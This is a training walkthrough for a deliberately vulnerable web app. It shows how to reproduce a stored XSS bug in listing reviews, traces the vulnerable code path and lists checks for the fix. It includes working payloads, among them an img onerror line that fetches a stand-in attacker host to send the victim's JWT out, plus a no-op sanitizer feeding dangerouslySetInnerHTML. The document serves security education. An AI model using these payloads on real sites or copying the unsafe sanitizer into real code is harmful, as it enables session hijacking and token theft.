# Flow — Simulating the Stored XSS Attack

The following walkthrough describes the original vulnerable behavior. The fix is
now implemented. Repeat the same steps to verify the secure behavior: no alert
appears, no attacker request is sent, and review text and safe formatting remain.

Verification after the fix:

| Input | Expected result |
| --- | --- |
| `<img src=x onerror="alert(...)">` | Image and handler removed; no alert |
| `<img src=x onerror="fetch(...)">` | Image and handler removed; no token request |
| `<svg onload="alert(1)"></svg>` | SVG removed; no alert |
| `<script>alert(1)</script>` | Script removed from the rendered DOM |
| `<a href="javascript:alert(1)">click</a>` | Unsafe URL removed; link text retained |
| `<b>bold</b>`, line breaks, safe HTTPS links | Formatting and safe links retained |

Review HTML is sanitized by DOMPurify before rendering. Helmet sends CSP on
Express API responses. The original Vite configuration is unchanged, so it does
not add CSP to the frontend document; the frontend's review protection is the
sanitizer. The original Jest suites check sanitized markup and API CSP headers.

`npm test` runs the repository's original 7 checks. The historical description of failing tests below
applies to the original starter, before these fixes.

This project ships a **deliberately vulnerable** feature: *Reviews on listings*. A
review's body is stored exactly as typed and rendered as raw HTML in every viewer's
browser. That lets an attacker store JavaScript that runs in other people's sessions —
a classic **stored (persistent) Cross-Site Scripting (XSS)** bug.

Because the app keeps its login token (`JWT`) in `localStorage`, the injected script can
read that token and hijack the victim's session.

Follow the steps below to reproduce the attack yourself, then read *Why it works* to
understand the code path, and the final section to run the tests.

---

## 0. Prerequisites & setup

From the **project root** (`Task-5.2/`):

```bash
npm install          # installs server + client (npm workspaces)
```

Make sure `server/.env` exists (create it if missing):

```
PORT=4000
MONGO_URI=<your MongoDB connection string>
JWT_SECRET=<any long random string>
JWT_EXPIRES_IN=7d
```

Start both apps:

```bash
npm run dev          # API on http://localhost:4000, client on http://localhost:5175
```

Open the client at **http://localhost:5175**.

---

## 1. Create an account and a listing

You need a logged-in user and a listing to attach a review to.

1. Click **Register**, create a user (e.g. `attacker@test.dev` / `secret123`).
2. You are now logged in — your JWT is saved in the browser under
   `localStorage['token']` (open DevTools → Application → Local Storage to see it).
3. Click **Sell an Item**, create any listing (e.g. *"Calculus Textbook"*, price `20`).
4. Go to **Listings** — your item appears with a **Reviews** button.

---

## 2. Plant the malicious review (the attack)

1. On your listing's card, click **Reviews** (this opens `/listings/<id>/reviews`).
2. In the **Your review** box, paste this payload as the review body and post it:

   ```html
   <img src=x onerror="alert('XSS — your token: ' + localStorage.getItem('token'))">
   ```

3. The review is now saved on the server **unchanged**.

> **Why `<img onerror>` and not `<script>`?**
> When HTML is injected through `innerHTML` / React's `dangerouslySetInnerHTML`, the
> browser **does not execute a bare `<script>` tag**. So a naive `<script>alert(1)</script>`
> payload looks scary but stays inert. Attackers instead use an element with an **event
> handler that fires automatically** — here `<img src=x>` fails to load (there is no image
> `x`), which triggers its `onerror` handler and runs our JavaScript. `<svg onload=...>`
> works the same way.

---

## 3. Observe the attack firing

As soon as the reviews list renders your review (it happens immediately after posting,
and again every time the page is loaded):

- An **alert box pops up showing the JWT** currently in `localStorage`.
- That proves **arbitrary attacker-controlled JavaScript is running** in the page, with
  full access to the victim's storage, cookies, and the logged-in session.

The alert is just a visible proof. A real attacker would **silently exfiltrate** the token
instead, e.g.:

```html
<img src=x onerror="fetch('https://attacker.example/steal?t=' + localStorage.getItem('token'))">
```

This is **stored/persistent** XSS: the payload lives in the database, so **every logged-in
user who opens that listing's reviews page** has their token stolen — no further action by
the attacker required.

---

## 4. Why it works (the vulnerable code path)

Trace a review body from input to screen:

1. **Server stores it raw** — `server/src/controllers/reviewController.js` validates only
   that `body` is a non-empty string (Joi). No HTML sanitization or escaping. It is saved
   verbatim and returned verbatim by `GET /api/reviews`.
2. **Client "sanitizes" it with a no-op** — `client/src/lib/sanitize.js`:

   ```js
   export const sanitizeHtml = (dirty) => dirty;   // returns the HTML untouched
   ```

3. **Client injects it as HTML** — `client/src/components/ReviewList.jsx`:

   ```jsx
   <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(r.body) }} />
   ```

   `dangerouslySetInnerHTML` sets `innerHTML` directly, so the attacker's markup becomes
   live DOM — including the `onerror` handler, which the browser runs.
4. **Nothing stops the inline script** — the server sends **no Content-Security-Policy
   header** (`server/src/app.js` has no `helmet`), so the browser has no policy telling it
   to refuse inline/injected JavaScript.

Fixing the bug means closing this path: sanitize the HTML before rendering **and** add a
CSP that blocks inline script. (That is exactly what the solution project does.)

---

## Running the tests locally

A test suite ships with the project. Run it from the **project root**:

```bash
npm install     # first time only
npm test        # (same as: npm run test)
```

What to expect **in this vulnerable project**:

- The tests describe the **secure** behavior the feature *should* have (review HTML is
  sanitized; the server sends a strict CSP header).
- So here they are **expected to FAIL** — currently **5 fail, 2 pass**. That red result is
  the starting point: your job is to make them green by applying the fix (sanitize on the
  client, add a CSP header on the server). The solution project shows all 7 passing.

Notes:

- The server tests spin up an **in-memory MongoDB** via `mongodb-memory-server`. The first
  run downloads a small `mongod` binary, so you need **internet access the first time**
  (it is cached afterwards).
- Use **Node.js 22.12+ or 24+** for the current dependency versions.
- The same `npm test` works on **Windows, macOS, and Linux** — no OS-specific setup.
